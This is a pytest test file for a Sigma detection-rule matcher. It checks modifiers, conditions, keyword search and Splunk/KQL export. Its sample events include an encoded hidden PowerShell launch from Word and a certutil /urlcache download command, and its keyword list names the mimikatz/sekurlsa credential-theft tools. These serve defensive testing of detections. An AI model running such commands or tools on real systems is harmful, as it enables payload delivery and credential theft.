import pytest

from sigilant.detection.sigma import SigmaError, SigmaRule, match_value


def rule(detection, logsource=None, **kw):
    return SigmaRule.from_dict({"title": "t", "id": "x", "level": "high",
                                "logsource": logsource or {"product": "windows"},
                                "detection": detection, **kw})


EV = {"logsource.product": "windows", "Image": r"C:\Windows\System32\powershell.exe",
      "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgA", "ParentImage": r"C:\Office\WINWORD.EXE",
      "DestinationIp": "91.92.243.17", "EventID": 1}


@pytest.mark.parametrize("actual,expected,mods,result", [
    ("PowerShell.EXE", "powershell.exe", frozenset(), True),
    ("abc", "a*c", frozenset(), True),
    ("abc", "a?c", frozenset(), True),
    ("abc", "b", frozenset({"contains"}), True),
    ("abc", "A", frozenset({"startswith"}), True),
    ("abc", "BC", frozenset({"endswith"}), True),
    ("abc123", r"\d{3}$", frozenset({"re"}), True),
    ("10.1.2.3", "10.0.0.0/8", frozenset({"cidr"}), True),
    ("91.92.243.17", "10.0.0.0/8", frozenset({"cidr"}), False),
    (None, None, frozenset(), True),
    (None, "x", frozenset(), False),
    (4720, 4720, frozenset(), True),
])
def test_match_value(actual, expected, mods, result):
    assert match_value(actual, expected, mods) is result


def test_and_or_not_precedence():
    r = rule({"a": {"EventID": 1}, "b": {"EventID": 2}, "c": {"Image|endswith": "\\cmd.exe"},
              "condition": "a or b and c"})
    assert r.matches(EV)
    r = rule({"a": {"EventID": 1}, "f": {"Image|endswith": "\\powershell.exe"}, "condition": "a and not f"})
    assert not r.matches(EV)


def test_of_quantifiers():
    det = {"sel_img": {"Image|endswith": "\\powershell.exe"},
           "sel_cmd": {"CommandLine|contains": "-enc"},
           "sel_missing": {"CommandLine|contains": "nothing-here"}}
    assert rule({**det, "condition": "1 of sel_*"}).matches(EV)
    assert not rule({**det, "condition": "all of sel_*"}).matches(EV)
    assert not rule({**det, "condition": "all of them"}).matches(EV)
    assert rule({**det, "condition": "all of sel_i* and sel_cmd"}).matches(EV)


def test_value_list_is_or_and_all_modifier_is_and():
    assert rule({"s": {"CommandLine|contains": ["zzz", "hidden"]}, "condition": "s"}).matches(EV)
    assert rule({"s": {"CommandLine|contains|all": ["-nop", "hidden"]}, "condition": "s"}).matches(EV)
    assert not rule({"s": {"CommandLine|contains|all": ["-nop", "zzz"]}, "condition": "s"}).matches(EV)


def test_windash_matches_slash_variant():
    ev = {**EV, "CommandLine": "certutil.exe /urlcache /split /f http://x/y"}
    assert rule({"s": {"CommandLine|windash|contains": "-urlcache"}, "condition": "s"}).matches(ev)


def test_list_of_maps_is_or():
    r = rule({"s": [{"EventID": 99}, {"ParentImage|endswith": "winword.exe"}], "condition": "s"})
    assert r.matches(EV)


def test_logsource_must_match():
    r = rule({"s": {"EventID": 1}, "condition": "s"}, logsource={"product": "linux"})
    assert not r.matches(EV)


def test_keywords_search_message():
    r = rule({"kw": ["mimikatz", "sekurlsa"], "condition": "kw"})
    assert r.matches({**EV, "message": "Invoke-Mimikatz loaded"})


@pytest.mark.parametrize("detection,error", [
    ({"s": {"EventID": 1}, "condition": "s and missing"}, "unknown selection"),
    ({"s": {"Image|bogus": "x"}, "condition": "s"}, "Unsupported modifier"),
    ({"s": {"EventID": 1}, "condition": "(s"}, "parenthesis"),
    ({"s": {"EventID": 1}, "condition": "s and"}, "ended unexpectedly"),
])
def test_invalid_rules_raise(detection, error):
    with pytest.raises(SigmaError, match=error):
        rule(detection)


def test_export_queries():
    r = rule({"sel": {"Image|endswith": "\\powershell.exe", "CommandLine|contains": "-enc"},
              "f": {"DestinationIp|cidr": "10.0.0.0/8"}, "condition": "sel and not f"})
    spl = r.to_query("splunk")
    kql = r.to_query("kql")
    assert 'Image="*\\\\powershell.exe"' in spl and "NOT" in spl
    assert 'CommandLine contains "-enc"' in kql and "ipv4_is_in_range" in kql and "not (" in kql
